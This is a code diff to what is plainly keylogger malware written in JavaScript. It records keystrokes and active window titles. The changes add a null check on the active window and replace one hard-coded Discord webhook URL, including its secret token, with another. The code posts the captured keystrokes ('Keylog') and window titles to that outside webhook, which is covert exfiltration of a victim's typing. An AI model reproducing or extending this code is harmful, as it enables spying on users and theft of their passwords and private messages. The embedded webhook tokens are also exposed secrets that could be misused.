@@ -265,19 +265,27 @@ v.addListener(function (e, down) {
 let previousActiveWindow;
 
 async function checkWindowChange() {
-  try {
-    const windowInfo = await activeWin();
-    const { title } = windowInfo;
+    try {
+        const windowInfo = await activeWin();
+        
+        // Check if windowInfo is null
+        if (!windowInfo) {
+            console.log("No active window found.");
+            return;
+        }
 
-    if (lastActiveWindow && lastActiveWindow.title !== title) {
-      sendToDiscord(title, lastActiveWindow.title);
+        const { title } = windowInfo;
+
+        if (lastActiveWindow && lastActiveWindow.title !== title) {
+            sendToDiscord(title, lastActiveWindow.title);
+        }
+
+        lastActiveWindow = { title };
+    } catch (error) {
+        console.error("Error getting active window:", error.message);
     }
-
-    lastActiveWindow = { title };
-  } catch (error) {
-    console.error("Error getting active window:", error.message);
-  }
 }
+
 
 async function sendToDiscord(currentTitle, previousTitle) {
   try {
@@ -285,7 +293,7 @@ async function sendToDiscord(currentTitle, previousTitle) {
       const content = `\`\`\`[Current Window: ${previousTitle}] \nKeylog: ${keylogs}\`\`\``;
 
       await axios.post(
-        "https://discord.com/api/webhooks/1232964574844813353/N3B1IiWcnAJegbs0zDkEIlCCrtDJAEgZATdEeXBe7OsPVzp9k56PMj1DAvwYMLudWrB9",
+        "https://discordapp.com/api/webhooks/1232964570310512701/09-u-au6SxtpF8mZs3SfsXuS9F4-2ryAZ_zIn0LHcR0R4Z4afNElHjszoMvEf7wx91UW",
         {
           content: content,
         }
